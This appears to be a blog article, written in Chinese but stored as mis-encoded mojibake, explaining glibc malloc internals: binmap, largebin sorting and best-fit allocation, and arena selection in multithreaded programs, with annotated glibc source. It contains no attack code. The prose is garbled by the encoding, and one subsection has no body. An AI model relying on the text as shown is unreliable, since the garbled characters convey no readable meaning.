<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"><span class="comment">//unsigned int binmap[4];</span></span><br></pre></td></tr></table></figure>





<p><code>i</code> å°±æ˜¯æ ¹æ®å †å—å¤§å°è½åˆ°çš„<code>largebin</code>ä¸‹æ ‡<code>idx</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))		<span class="comment">//æ ‡è®°ä¸‹æ ‡ä¸ºiçš„æ¡¶å­ä¸­æœ‰è‡³å°‘ä¸€ä¸ªå †å—</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unmark_bin(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp;= ~(idx2bit (i)))	<span class="comment">//æ ‡è®°ä¸‹æ ‡ä¸ºiçš„æ¡¶å­ä¸­ä¸€ä¸ªå †å—ä¹Ÿæ²¡æœ‰</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> get_binmap(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp; idx2bit (i))		<span class="comment">//æŸ¥çœ‹ä¸‹æ ‡ä¸ºiçš„æ¡¶å­ä¸­æœ‰æ²¡æœ‰å †å—</span></span></span><br></pre></td></tr></table></figure>

<p>æ¯”å¦‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mark_bin(m,63) </span><br><span class="line">	binmap[63&gt;&gt;5] |= ((1U &lt;&lt; ((63) &amp; ((1U &lt;&lt; 5) - 1))))</span><br><span class="line">	binmap[1] |= (1&lt;&lt;31)</span><br><span class="line">	</span><br><span class="line">mark_bin(m,64)</span><br><span class="line">	binmap[2] |= (1&lt;&lt;0)</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯å¯¹äº<code>largebin</code>æ¥è¯´,<code>binmap[0]</code>æ°¸è¿œç”¨ä¸åˆ°</p>
<h4 id="algorithm-4"><a href="#algorithm-4" class="headerlink" title="algorithm"></a>algorithm</h4><p><code>largebin</code>ä¸­çš„å †å—,åªèƒ½æ˜¯æ¥è‡ªäº<code>unsortedbin</code></p>
<p>å¦‚æœæŸæ¬¡<code>malloc</code>æ²¡æœ‰ä»<code>tcache,fastbins,smallbins</code>,ä¸­å¾—åˆ°æƒ³è¦çš„å †å—</p>
<p>æ­¤æ—¶éœ€è¦éå†<code>unsortedbin</code>,æ•´ç†å…¶ä¸­çš„æ‰€æœ‰å †å—,å½’ç±»åˆ°<code>smallbins</code>æˆ–è€…<code>largebins</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//unsortedbinæ•´ç†ç®—æ³•:</span></span><br><span class="line"></span><br><span class="line">å¦‚æœunsortedbinåªæœ‰last_remainderå¹¶ä¸”ä»–èƒ½æ»¡è¶³åˆ†é…éœ€æ±‚</span><br><span class="line">	é‚£ä¹ˆä»last_remainderå¤´éƒ¨åˆ‡å‡ºéœ€æ±‚,å‰©ä¸‹çš„ç»§ç»­ä½œä¸ºlast_remainder,ç„¶åè¿”å›</span><br><span class="line"></span><br><span class="line">å¦åˆ™ å°†unsortedä¸Šçš„è¿™å—å…ˆæ‹¿ä¸‹æ¥</span><br><span class="line">	å¦‚æœè¿™å—çš„å¤§å°æ­£å¥½ç­‰äºéœ€æ±‚</span><br><span class="line">		å¦‚æœtcacheä¸æ»¡åˆ™å…ˆæ¬åˆ°tcacheå¹¶è®°ä¸‹tcacheå¯ä»¥æ»¡è¶³,<span class="keyword">continue</span>, åœ¨æ•´ç†å®Œæ‰€æœ‰unsortedbinä¹‹åå†è¿”å›, æ•´ç†è¿‡ç¨‹ä¸­å¦‚æœtcacheæ»¡äº†ä¹Ÿä¼šè¿”å›</span><br><span class="line">		å¦åˆ™tcacheæ»¡åˆ™ç›´æ¥è¿”å›</span><br><span class="line">	å¦åˆ™</span><br><span class="line">		å¦‚æœè¿™å—åœ¨smallbinèŒƒå›´å†…å°±æ”¾åˆ°smallbin</span><br><span class="line">		å¦åˆ™è¿™å—åœ¨largebinèŒƒå›´å†…å°±æ”¾åˆ°largebin</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å°†<code>unsortedbin</code>å †å—æ”¾åˆ°<code>smallbins</code>ä¸­æ—¶éå¸¸ç®€å•,å› ä¸º<code>smallbins</code>ä¸­çš„å †å—å¤§å°å’Œæ¡¶å­ä¸‹æ ‡æœ‰ä¸¥æ ¼çš„å…³ç³»,æ ¹æ®å †å—å¤§å°è®¡ç®—å‡ºä¸‹æ ‡,å¤´æ’æ³•ä¸€å¡å°±å®Œäº†</p>
<p><strong>ä½†æ˜¯å¾€<code>largebin</code>æ”¾æ—¶,ä¸€ä¸ª<code>bin</code>é‡Œé¢å¯èƒ½ä¼šæœ‰ä¸åŒå¤§å°çš„å †å—,éœ€è¦å…ˆé€šè¿‡è·³è¡¨ç´¢å¼•è¿›è¡Œæ’å…¥æ’åº</strong></p>
<h5 id="æ’å…¥æ›´å°çš„å †å—"><a href="#æ’å…¥æ›´å°çš„å †å—" class="headerlink" title="æ’å…¥æ›´å°çš„å †å—"></a>æ’å…¥æ›´å°çš„å †å—</h5><p>å‡è®¾ç°åœ¨<code>bin_at(M,63)</code>ä¸­å·²ç»æœ‰<code>0x421,0x411</code>çš„è·³è¡¨ç´¢å¼•</p>
<p>åˆè¦å°†ä¸€ä¸ª<code>0x401</code>çš„å †å—æ”¾è¿›å»</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241101203700160.png" alt="image-20241101203700160"></p>
<h5 id="æ’å…¥å·²æœ‰ç´¢å¼•çš„å †å—"><a href="#æ’å…¥å·²æœ‰ç´¢å¼•çš„å †å—" class="headerlink" title="æ’å…¥å·²æœ‰ç´¢å¼•çš„å †å—"></a>æ’å…¥å·²æœ‰ç´¢å¼•çš„å †å—</h5><p>å‡è®¾ç°åœ¨<code>bin_at(M,63)</code>ä¸­å·²ç»æœ‰<code>0x421,0x411,0x401</code>çš„è·³è¡¨ç´¢å¼•</p>
<p>åˆè¦å°†ä¸€ä¸ª<code>0x411</code>çš„å †å—æ”¾è¿›å»,é‚£ä¹ˆè¿‡ç¨‹å°†ä¼šæ˜¯è¿™æ ·çš„:</p>
<p>0.è®¡ç®—å¾—çŸ¥<code>0x411</code>è½åœ¨<code>bin_at(M,63)</code>èŒƒå›´</p>
<p>1.ä¸<code>bin_at(M,63)-&gt;bk</code>,ä¹Ÿå°±æ˜¯è¿™ä¸ª<code>bin</code>é‡Œæœ€å°çš„å †å—,ä¹Ÿå°±æ˜¯ä¸€ä¸ª<code>0x401</code>çš„å †å—è¿›è¡Œæ¯”è¾ƒ,å‘ç°æ–°æ”¾å…¥çš„å †å—<strong>ä¸æ˜¯æœ€å°çš„</strong>,ä¸èƒ½ç›´æ¥æ”¾åˆ°<code>bin_at(M,63)-&gt;bk</code>ä¸Š,éœ€è¦ä»å¤§åˆ°å°éå†è¿™ä¸ª<code>bin</code>,è¿›è¡Œ<strong>æ’å…¥æ’åº</strong></p>
<p>2.ä»<code>bin_at(M,63)-&gt;fd</code>,æœ‰å°±æ˜¯è¿™ä¸ª<code>bin</code>é‡Œæœ€å¤§çš„å †å—,ä¹Ÿå°±æ˜¯ä¸<code>0x421</code>å¼€å§‹æ¯”è¾ƒ,å‘ç°æ–°æ”¾å…¥çš„å †å—æ¯”ä»–å°</p>
<p>3.åˆ©ç”¨<code>0x421</code> ä¸Šçš„è·³è¡¨ç´¢å¼•,æ‰¾åˆ°äº†<code>0x411</code>çš„,æ–°å †å—å¯ä»¥æ”¾åˆ°è¿™é‡Œäº†</p>
<p>4.ä¿æŒè·³è¡¨ç´¢å¼•å †å—ä¸å˜,åœ¨å…¶<code>fd</code>ä¸Šæ’å…¥æ–°å †å—</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030153014682.png" alt="image-20241030153014682"></p>
<h5 id="æ’å…¥ä¸å­˜åœ¨ç´¢å¼•çš„å †å—"><a href="#æ’å…¥ä¸å­˜åœ¨ç´¢å¼•çš„å †å—" class="headerlink" title="æ’å…¥ä¸å­˜åœ¨ç´¢å¼•çš„å †å—"></a>æ’å…¥ä¸å­˜åœ¨ç´¢å¼•çš„å †å—</h5><p>å‡è®¾ç°åœ¨<code>bin_at(M,63)</code>ä¸­å·²ç»æœ‰<code>0x421,0x401</code>çš„è·³è¡¨ç´¢å¼•</p>
<p>åˆè¦å°†ä¸€ä¸ª<code>0x411</code>çš„å †å—æ”¾è¿›å»,é‚£ä¹ˆè¿‡ç¨‹å°†ä¼šæ˜¯è¿™æ ·çš„:</p>
<h5 id="å½“å‰binä¸­æœ‰å †å—æ—¶æ‹¿èµ°ä¸€ä¸ª"><a href="#å½“å‰binä¸­æœ‰å †å—æ—¶æ‹¿èµ°ä¸€ä¸ª" class="headerlink" title="å½“å‰binä¸­æœ‰å †å—æ—¶æ‹¿èµ°ä¸€ä¸ª"></a>å½“å‰binä¸­æœ‰å †å—æ—¶æ‹¿èµ°ä¸€ä¸ª</h5><p><code>largebin</code> åœ¨æ‹¿èµ°å †å—æ—¶é‡‡ç”¨æœ€ä½³é€‚é…ç­–ç•¥,ä¹Ÿå°±æ˜¯è¯´å°½é‡æ‰¾ä¸€ä¸ªæœ€å°çš„å †å—æ»¡è¶³åˆ†é…éœ€æ±‚</p>
<p>é¦–å…ˆè®¡ç®—å¾—åˆ°<code>bin_at(M,idx)</code></p>
<p>ç„¶åé€šè¿‡<code>fd</code>é“¾è¡¨æ‰¾åˆ°è¯¥<code>bin</code>ä¸­æœ€å¤§çš„å—</p>
<p>å¦‚æœæœ€å¤§çš„å—éƒ½æ— æ³•æ»¡è¶³éœ€æ±‚,åˆ™ä½¿ç”¨<code>largebin</code>æ˜¾ç„¶æ— æ³•æ»¡è¶³éœ€æ±‚,æ²¡å¿…è¦åœ¨<code>largebin</code>è¿™é‡Œæµªè´¹æ—¶é—´äº†</p>
<p>å¦åˆ™æœ¬<code>bin</code>ä¸­å¿…ç„¶å­˜åœ¨èƒ½å¤Ÿæ»¡è¶³éœ€æ±‚çš„å—,èµ·ç æœ€å¤§çš„å—è‚¯å®šå¯ä»¥,ä½†æ˜¯ç›´æ¥ç”¨è¿™ä¸ªæœ€å¤§å—å¤ªäº,åˆ‡å‰²æœ€å¤§å—ä¹‹åé€ æˆå¤–éƒ¨ç¢ç‰‡çš„å¯èƒ½æ€§æ›´å¤§,å› æ­¤æ¥ä¸‹æ¥éœ€è¦æ‰¾åˆ°æœ€ä½³é€‚é…çš„ä¸´ç•Œå—</p>
<p>åˆ©ç”¨æœ€å¤§å—çš„<code>bk_nextsize</code>ç´¢å¼•è·³åˆ°æœ€å°å—ä¸Š,ç„¶åå†æ²¿ç€<code>bk_nextsize</code>å‘æ›´å¤§å—éå†,å¦‚æ­¤å¯»æ‰¾æœ€ä½³é€‚é…</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030155542420.png" alt="image-20241030155542420"></p>
<p>æ‰¾åˆ°æœ€ä½³é€‚é…å,é¦–å…ˆå°è¯•æ‹¿èµ°æ™®é€šå †å—,æ²¡æœ‰æ™®é€šå †å—å†æ‹¿èµ°ç´¢å¼•å †å—,</p>
<p>ç„¶ååœ¨è¿™ä¸ªå †å—ä¸Šåˆ‡å‰²å‡ºåˆ†é…éœ€æ±‚æ¥,</p>
<p>å¦‚æœå‰©ä½™çš„ä¸‹è„šæ–™å¤ªå°äº†,å°äº<code>0x20</code>å­—èŠ‚,å°±ä¸æŠ æœäº†,æ•´ä¸ªæ™®é€šèŠ‚ç‚¹å…¨éƒ½è¿”å›,å°±å½“é€äººäº†</p>
<p>å¦‚æœå‰©ä½™çš„ä¸‹è„šæ–™è¿˜è¡Œ,å¤§äºç­‰äº<code>0x20</code>,é‚£ä¹ˆå°±æŠŠä¸‹è„šæ–™æ‰”ç»™<code>unsortedbin</code></p>
<h5 id="å½“å‰binä¸­æ²¡æœ‰å †å—æ—¶æ‹¿èµ°ä¸€ä¸ª"><a href="#å½“å‰binä¸­æ²¡æœ‰å †å—æ—¶æ‹¿èµ°ä¸€ä¸ª" class="headerlink" title="å½“å‰binä¸­æ²¡æœ‰å †å—æ—¶æ‹¿èµ°ä¸€ä¸ª"></a>å½“å‰binä¸­æ²¡æœ‰å †å—æ—¶æ‹¿èµ°ä¸€ä¸ª</h5><p>é¦–å…ˆæ ¹æ®å †å—å¤§å°è®¡ç®—å‡º<code>idx</code></p>
<p>å‘ç°<code>idx</code>å¯¹åº”çš„<code>largebin</code>ä¸­æ²¡æœ‰å †å—</p>
<p>äºæ˜¯æ²¿ç€<code>idx++</code>çš„æ–¹å‘,å‘æ›´å¤§çš„<code>bin</code>ä¸­å¯»æ‰¾ç›®æ ‡</p>
<p>è¿™ä¸ªå¯»æ‰¾çš„è¿‡ç¨‹ä½¿ç”¨äº†<code>binmap</code>åŠ é€Ÿ</p>
<p>æ•´ä¸ª<code>binmap</code>åˆ†ä¸ºå››ä¸ª<code>block</code>, å¯¹åº”åˆ°å››ä¸ª<code>int</code></p>
<p>æ ¹æ®å½“å‰<code>bin</code>çš„ä¸‹æ ‡<code>idx</code>è®¡ç®—å‡ºæ‰€å±çš„<code>block</code></p>
<p>å¦‚æœ<code>binmap[block] &gt; idx2bit(idx)</code></p>
<p>è¿™å°±è¯´æ˜<code>idx</code>æ‰€å±çš„å—ä¸­,<strong>å¯èƒ½</strong>å­˜åœ¨æ›´å¤§çš„<code>bin</code>,å…¶ä¸­æœ‰å †å—</p>
<p>æ‰¾åˆ°è¿™ä¸ªæ›´å¤§çš„<code>bin</code>,å®é™…åˆ¤æ–­ä¸€ä¸‹å…¶ä¸­åˆ°åº•æœ‰æ²¡æœ‰å †å—</p>
<p>ä»è¿™ä¸ªå¤§<code>bin</code>ä¸­æ‹¿å‡ºä¸€å—åˆ‡å‰²,è¿”å›</p>
<p>åˆ‡å‰©ä¸‹çš„å¦‚æœå¾ˆå°åˆ™ä¸€å¹¶è¿”å›äº†</p>
<p>å¦åˆ™æ”¾åˆ°<code>unsortedbin</code></p>
<h2 id="å¤šçº¿ç¨‹åœºæ™¯"><a href="#å¤šçº¿ç¨‹åœºæ™¯" class="headerlink" title="å¤šçº¿ç¨‹åœºæ™¯"></a>å¤šçº¿ç¨‹åœºæ™¯</h2><h3 id="free-2"><a href="#free-2" class="headerlink" title="free"></a>free</h3><p>åœ¨é€šå¸¸æƒ…å†µä¸‹,å †åŒºçš„ç”³è¯·å’Œé‡Šæ”¾åªä¼šä½¿ç”¨åˆ°ä¸»åˆ†é…åŒº<code>main_arena</code>,åœ¨å¤šçº¿ç¨‹ç­‰æƒ…å†µä¸‹å¯èƒ½å­˜åœ¨å¤šä¸ªåˆ†é…åŒº,ä½†æ˜¯æˆ‘ä»¬ä¾ç„¶åªç®¡<code>malloc</code>å’Œ<code>free</code>,å¹¶æ²¡æœ‰æŒ‡å®šä»å“ªä¸ªåˆ†é…åŒºç”³è¯·æˆ–è€…é‡Šæ”¾å †å—</p>
<p>é¦–å…ˆè¯´é‡Šæ”¾:</p>
<p>å®é™…ä¸Šæ˜¯<code>libc_free</code>å†³å®šäº†å¾€å“ªé‡Œé‡Šæ”¾</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __libc_free(<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    mchunkptr p; <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mem == <span class="number">0</span>) <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    p = mem2chunk(mem);</span><br><span class="line">    <span class="comment">//å¯¹äºmmapç”³è¯·çš„å †å—,ä½¿ç”¨munmapå€’å›å»</span></span><br><span class="line">    <span class="keyword">if</span> (chunk_is_mmapped(p)) <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">        munmap_chunk(p);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;       <span class="comment">//ä»åˆ†é…åŒºæ¥çš„å †å—,è¿˜ç»™åˆ†é…åŒº</span></span><br><span class="line">        MAYBE_INIT_TCACHE();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Mark the chunk as belonging to the library again.  */</span></span><br><span class="line">        (<span class="type">void</span>)tag_region(chunk2mem(p), memsize(p));</span><br><span class="line"></span><br><span class="line">        ar_ptr = arena_for_chunk(p);</span><br><span class="line">        _int_free(ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨è°ƒç”¨<code>_int_free</code>æ—¶ä¼ é€’äº†åˆ†é…åŒºæŒ‡é’ˆ<code>ar_ptr</code>,ä»–æ˜¯è¿™æ ·è®¡ç®—çš„:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ar_ptr = arena_for_chunk(p);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> malloc_state *</span><br><span class="line"><span class="title function_">arena_for_chunk</span> <span class="params">(mchunkptr ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> chunk_main_arena (ptr) ? &amp;main_arena : heap_for_ptr (ptr)-&gt;ar_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œ<code>chunk_main_arena(ptr)</code>ä¼šæ£€æŸ¥å †å—çš„Aæ ‡å¿—ä½,å¯¹äºæ¥è‡ªéä¸»åˆ†é…åŒºçš„å †å—,ä¼šè°ƒç”¨<code>heap_for_ptr</code>è®¡ç®—å…¶æ‰€åœ¨åˆ†é…åŒº</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> heap_info *</span><br><span class="line"><span class="title function_">heap_for_ptr</span> <span class="params">(<span class="type">void</span> *ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> max_size = heap_max_size ();</span><br><span class="line">  <span class="keyword">return</span> PTR_ALIGN_DOWN (ptr, max_size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™å¹²äº†ä¸ªå•¥äº‹å‘¢?</p>
<p><code>max_size</code>å®é™…ä¸Šæ˜¯<code>64M</code>,ç„¶å<code>ptr</code>å‘ä¸‹å¯¹é½åˆ°<code>64M</code>,æ˜¯ä»€ä¹ˆä¸€ä¸ªæ•ˆæœå‘¢?</p>
<p><code>ptr &amp; 0xfffffffffc000000</code></p>
<p>æ¯”å¦‚å‡è®¾<code>ptr = 0x555558026520</code></p>
<p>é‚£ä¹ˆæ­¤æ—¶<code>ptr &amp; 0xfffffffffc000000 = 0x555558026520 &amp; 0xfffffffffc000000 = 0x555558000000</code></p>
<p>è¿™ä¸ªå€¼å°±è¢«è®¤ä¸ºæ˜¯<code>ptr</code>æ‰€åœ¨çš„åˆ†é…åŒºæè¿°ç¬¦<code>heap_info</code>çš„ä½ç½®</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">type = <span class="keyword">struct</span> _heap_info &#123;</span><br><span class="line"><span class="comment">/* 0x0000      |  0x0008 */</span>    mstate ar_ptr;</span><br><span class="line"><span class="comment">/* 0x0008      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span></span><br><span class="line"><span class="comment">/* 0x0010      |  0x0008 */</span>    <span class="type">size_t</span> size;</span><br><span class="line"><span class="comment">/* 0x0018      |  0x0008 */</span>    <span class="type">size_t</span> mprotect_size;</span><br><span class="line"><span class="comment">/* 0x0020      |  0x0008 */</span>    <span class="type">size_t</span> pagesize;</span><br><span class="line"><span class="comment">/* 0x0028      |  0x0008 */</span>    <span class="type">char</span> pad[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):   48 */</span></span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå…¶ä¸­çš„<code>ar_ptr</code>å°±æ˜¯åˆ†é…åŒº<code>malloc_state</code>æŒ‡é’ˆ</p>
<p>ä¹Ÿå°±æ˜¯è¯´, å¯¹äºä¸€ä¸ªå †å—p</p>
<p>å¦‚æœå…¶æœ‰æ ‡å¿—ä½A,é‚£ä¹ˆç›´æ¥ä½¿ç”¨<code>glibc</code>ä¸­çš„<code>main_arena</code>æŒ‡é’ˆè¿”å›ä¸»åˆ†é…åŒº</p>
<p>å¦‚æœå…¶æ— æ ‡å¿—ä½A,é‚£ä¹ˆé¦–å…ˆå°†å…¶åœ°å€å‘ä¸‹å¯¹é½åˆ°<code>64M</code>å¾—åˆ°<code>heap_info</code>çš„ä½ç½®,ç„¶åå¾—åˆ°<code>ar_ptr</code>çš„ä½ç½®</p>
<h3 id="malloc-3"><a href="#malloc-3" class="headerlink" title="malloc"></a>malloc</h3><p>å¦‚æœåªæœ‰ä¸€ä¸ªçº¿ç¨‹æ˜¾ç„¶ä¸éœ€è¦å»ºç«‹å¤šä¸ªåˆ†é…åŒº,å› ä¸ºæ§åˆ¶æµåŒä¸€æ—¶é—´åªèƒ½æœ‰ä¸€ä¸ªåˆ†é…è¯·æ±‚</p>
<p>é‚£ä¹ˆå¯¹äºå¤šçº¿ç¨‹ç¯å¢ƒ,é¦–å…ˆå¦‚ä½•ç•Œå®šå¤šçº¿ç¨‹å‘¢?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __ASSEMBLER__</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> __libc_multiple_threads;</span><br><span class="line">libc_hidden_proto (__libc_multiple_threads)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !defined SINGLE_THREAD_BY_GLOBAL || IS_IN (rtld)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> SINGLE_THREAD_P \</span></span><br><span class="line"><span class="meta">  (THREAD_GETMEM (THREAD_SELF, header.multiple_threads) == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> SINGLE_THREAD_P (__libc_multiple_threads == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RTLD_SINGLE_THREAD_P SINGLE_THREAD_P</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* _SINGLE_THREAD_H  */</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¦‚æœTCBä¸­æœ‰å®šä¹‰multiple_threadså­—æ®µ,åˆ™æ£€æŸ¥è¯¥å­—æ®µæ˜¯å¦ä¸º1</p>
<p>å¦åˆ™æ£€æŸ¥glibcçš„<code>__libc_multiple_threads</code>å˜é‡æ˜¯å¦ä¸º1</p>
<p>åœ¨x86ä¸Šä½¿ç”¨å‰è€…</p>
<p>è¿™ä¸ªå¤šçº¿ç¨‹å­—æ®µä¼šæŒ‡å¯¼mallocçš„è¡Œä¸º</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (SINGLE_THREAD_P)		<span class="comment">//å•çº¿ç¨‹æ—¶çš„è¡Œä¸º</span></span><br><span class="line">   &#123;</span><br><span class="line">     victim = tag_new_usable (_int_malloc (&amp;main_arena, bytes));</span><br><span class="line">     assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">     <span class="keyword">return</span> victim;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//ä¸‹ä¸ºå¤šçº¿ç¨‹æ—¶è¡Œä¸º</span></span><br><span class="line"> arena_get (ar_ptr, bytes);	</span><br><span class="line"></span><br><span class="line"> victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line"> <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">    before.  */</span></span><br><span class="line"> <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">     ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">     victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">   __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line"> victim = tag_new_usable (victim);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åœ¨å¤šçº¿ç¨‹åœºæ™¯ä¸‹</p>
<p>é¦–å…ˆå°è¯•<code>arena_get(ar_ptr = NULL,bytes)</code>æ‹¿åˆ°ä¸€ä¸ªåˆ†é…åŒº</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#define arena_get(ptr, size) do &#123; \</span><br><span class="line">      ptr = thread_arena;						      \</span><br><span class="line">      arena_lock (ptr, size);						      \</span><br><span class="line">  &#125; while (0)</span><br><span class="line"></span><br><span class="line">#define arena_lock(ptr, size) do &#123;					      \</span><br><span class="line">      if (ptr)								      \</span><br><span class="line">        __libc_lock_lock (ptr-&gt;mutex);					      \</span><br><span class="line">      else								      \</span><br><span class="line">        ptr = arena_get2 ((size), NULL);				      \</span><br><span class="line">  &#125; while (0)</span><br></pre></td></tr></table></figure>

<p>ä¸»çº¿ç¨‹ä¼šæœ‰<code>thread_arena = &amp;main_arena</code></p>
<p>å¯¹äºå…¶ä»–çº¿ç¨‹,ç¬¬ä¸€æ¬¡å°è¯•åˆ†é…æ—¶,<code>thread_arena = NULL</code></p>
